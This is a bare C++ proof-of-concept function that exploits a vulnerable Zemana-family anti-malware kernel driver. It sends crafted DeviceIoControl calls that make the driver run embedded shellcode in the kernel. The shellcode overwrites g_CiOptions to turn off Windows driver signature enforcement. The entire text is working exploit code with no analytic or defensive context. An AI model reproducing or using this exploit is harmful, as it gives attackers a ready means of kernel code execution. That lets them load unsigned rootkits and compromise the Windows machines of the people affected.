int PoC(DWORD64 addr,bool modeSwitch,DWORD offset)
{
	// Shellcode to zero g_CiOptions
	char shell[] = {/*push rbx*/ 0x53,/*mov rbx,value*/ 0x48, 0xbb,/*value*/0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00/*value*/,/*mov byte ptr[rbx],val*/ 0xC6, 0x03,/*val*/ 0x00/*val*/, /*push 0*/0x6a, 0x00, /*pop rax*/0x58, /*pop rbx*/0x5b,/*nop*/ 0x90, /*ret*/0xc3 };
	PDWORD64 shellCiOptionAddr = (PDWORD64)(shell + 3);
	*shellCiOptionAddr = addr;
	if (modeSwitch)
	{
		shell[13] = 0x06;
	}

	LPVOID a,b;

	a = VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	b = VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!a || !b)
		return -1;

	PBYTE foo = 0;
	
	// Store shellcode
	foo = (PBYTE)a + 0x108;
	for (int i = 0; i < sizeof(shell); i++)
	{
		foo[i] = shell[i];
	}

	PDWORD buf = 0;

	// Store the offset of the some function of ntoskrnl (for example KeAreApcsDisabled)
	buf = (PDWORD)((PBYTE)a + 0x104);
	*buf = offset;

	buf = (PDWORD)((PBYTE)a + 0x188);
	*buf = 0x0;


	HANDLE h = CreateFileW(L"\\\\.\\amsdk", 0xC0000000, 0x3, 0, 3, 0, 0); //  for zam64.sys and zamguard64.sys change "\\\\.\\amsdk" to "\\\\.\\ZemanaAntiMalware"
	if (INVALID_HANDLE_VALUE == h)
	{
		cout << "Error create" << endl;
		return -1;
	}
	DWORD dw = 0;
	DWORD pid = GetCurrentProcessId();
	DWORD current = 0;

	BOOL c = DeviceIoControl(h, 0x80002010, &pid, 4, &current, 4, &dw, 0);
	if (!c)
	{
		cout << "Reg error" << endl;
		return -1;
	}
	c = DeviceIoControl(h, 0x80002044, a, (DWORD)0x1000, b, (DWORD)0x1000, &dw, 0);
	if (!c)
	{
		cout << "Stub filling error " << endl;
		return -1;
	}

	memset(a, 0, 0x10000);
	buf = (PDWORD)((PBYTE)a + 0x14);
	*buf = 0x200; 

	buf = (PDWORD)((PBYTE)a + 0x10);
	*buf = 0x5;

	c = DeviceIoControl(h, 0x80002014, a, (DWORD)0x1000, b, (DWORD)0x1000, &dw, 0);

	VirtualFree(a, 0, MEM_RELEASE);
	VirtualFree(b, 0, MEM_RELEASE);
	CloseHandle(h);

	return 0;
}
